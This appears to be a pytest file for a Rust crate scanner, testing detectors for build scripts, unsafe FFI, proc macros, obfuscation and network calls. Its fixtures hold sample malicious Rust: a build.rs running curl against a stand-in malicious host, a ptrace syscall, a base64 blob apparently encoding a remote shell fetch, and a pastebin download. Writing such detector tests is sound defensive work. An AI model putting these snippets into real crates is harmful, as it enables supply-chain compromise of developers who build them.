import pytest
from pathlib import Path
from crateshield.signals.extractor import rust_parser
from crateshield.signals.build_rs import analyze_build_rs
from crateshield.signals.unsafe_ffi import analyze_unsafe_ffi
from crateshield.signals.proc_macro import analyze_proc_macro
from crateshield.signals.obfuscation import analyze_obfuscation
from crateshield.signals.network import analyze_network


@pytest.fixture
def parser():
    return rust_parser()


def test_build_rs_malicious(parser, tmp_path):
    build_rs = """
fn main() {
    std::process::Command::new("curl").arg("http://malicious.com").status().unwrap();
}
    """
    res = analyze_build_rs({"build_rs": build_rs}, parser)
    assert res["has_build_rs"] is True
    assert "process_spawn" in res["signals"]
    assert len(res["evidence"]) > 0
    assert res["evidence"][0]["file"] == "build.rs"


def test_build_rs_benign(parser, tmp_path):
    build_rs = """
fn main() {
    println!("cargo:rustc-link-lib=foo");
}
    """
    res = analyze_build_rs({"build_rs": build_rs}, parser)
    assert res["has_build_rs"] is True
    assert len(res["signals"]) == 0
    assert len(res["evidence"]) == 0


def test_unsafe_ffi_malicious(parser, tmp_path):
    src = tmp_path / "lib.rs"
    src.write_text("""
unsafe fn hook() {
    libc::syscall(libc::SYS_ptrace, 0, 0, 0, 0);
}
    """)
    res = analyze_unsafe_ffi({"source_files": [src]}, parser)
    assert res["unsafe_fn_count"] == 1
    assert len(res["syscall_usage"]) > 0
    assert len(res["evidence"]) > 0


def test_proc_macro_malicious(tmp_path):
    src = tmp_path / "lib.rs"
    src.write_text("""
use std::fs::File;
#[proc_macro]
pub fn do_it(s: TokenStream) -> TokenStream { s }
    """)
    res = analyze_proc_macro({"cargo_toml": "proc-macro = true", "source_files": [src]})
    assert res["is_proc_macro"] is True
    assert "std::fs" in res["proc_macro_suspicious_imports"]
    assert len(res["evidence"]) > 0


def test_obfuscation(parser, tmp_path):
    src = tmp_path / "lib.rs"
    src.write_text("""
fn main() {
    let payload = "ZXhlYyBzaCAvaHR0cDovL21hbGljaW91cy5jb20vYmFzaA==";
    let long_hex = "41414141414141414141414141414141414141414141";
    println!("{}", payload);
}
    """)
    res = analyze_obfuscation({"source_files": [src]}, parser)
    assert len(res["base64_blobs"]) > 0
    assert len(res["hex_blobs"]) > 0
    assert len(res["evidence"]) > 0


def test_network_hardcoded(parser, tmp_path):
    src = tmp_path / "lib.rs"
    src.write_text("""
fn main() {
    reqwest::get("https://pastebin.com/raw/xyz");
}
    """)
    res = analyze_network({"source_files": [src]}, parser)
    assert res["has_network"] is True
    assert len(res["suspicious_domains"]) > 0
    assert len(res["evidence"]) > 0
